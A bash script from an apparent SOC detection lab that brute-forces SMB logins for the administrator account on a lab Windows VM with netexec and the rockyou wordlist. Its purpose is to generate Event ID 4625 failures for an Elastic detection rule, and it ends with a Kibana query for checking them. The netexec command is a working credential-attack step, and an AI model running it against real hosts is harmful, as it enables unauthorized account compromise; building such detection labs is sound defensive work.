#!/bin/bash
# =============================================================================
# Script      : smb-bruteforce.sh
# Author      : KuRo (KuRo0x)
# Lab         : KuRo SOC Detection Lab
# Incident    : INC-004 — SMB Brute Force (Event ID 4625)
# Attacker VM : kali (172.16.0.11)
# Target VM   : DESKTOP-DPU3CDQ (172.16.0.10) — SMB on TCP 445
# Purpose     : Simulate SMB credential brute-force against the local
#               administrator account using netexec to generate
#               Event ID 4625 (Failed Logon) in Windows Security logs
#               shipped by Winlogbeat 8.19.15 to Elasticsearch (winlogbeat-* index)
# Detection   : Elastic Security rule — "SMB Brute Force on Administrator"
# MITRE ATT&CK: T1110 — Brute Force | TA0006 Credential Access
# WARNING     : Run ONLY inside the isolated VMnet3 lab network (172.16.0.0/24)
# =============================================================================

TARGET="172.16.0.10"
USER="administrator"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Starting SMB brute-force against $TARGET"
echo "[*] User     : $USER"
echo "[*] Wordlist : $WORDLIST"
echo "[*] Expected logs: Windows Security Event ID 4625 on DESKTOP-DPU3CDQ"
echo "[*] Expected index: winlogbeat-* in Kibana"
echo ""

netexec smb "$TARGET" \
        -u "$USER" \
        -p "$WORDLIST" \
        --continue-on-success

echo ""
echo "[*] Attack complete. Check Kibana Discover:"
echo "    Index: winlogbeat-*"
echo "    KQL  : event.code: \"4625\" and source.ip: \"172.16.0.11\""
echo "    Rule : SMB Brute Force on Administrator"
